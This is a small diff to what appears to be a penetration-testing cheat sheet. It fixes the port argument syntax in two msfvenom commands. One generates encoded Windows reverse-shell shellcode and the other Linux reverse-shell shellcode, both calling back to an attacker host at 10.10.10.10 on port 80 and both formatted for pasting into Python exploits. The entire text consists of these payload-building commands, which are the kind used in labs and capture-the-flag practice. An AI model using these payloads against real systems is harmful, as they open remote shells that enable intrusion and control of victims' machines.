@@ -1,12 +1,12 @@
 ### Shellcode
 ##### Windows
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT 80 EXITFUNC=thread -f python -a x86 -b "\x00" -e x86/shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=80 EXITFUNC=thread -f python -a x86 -b "\x00" -e x86/shikata_ga_nai
 ```
 
 ##### Linux
 ```bash
-msfvenom -p linux/shell_reverse_tcp LHOST=10.10.10.10 LPORT 80 EXITFUNC=thread -f python -a x86 -b "\x00"
+msfvenom -p linux/shell_reverse_tcp LHOST=10.10.10.10 LPORT=80 EXITFUNC=thread -f python -a x86 -b "\x00"
 ```
 
 ### Exploit
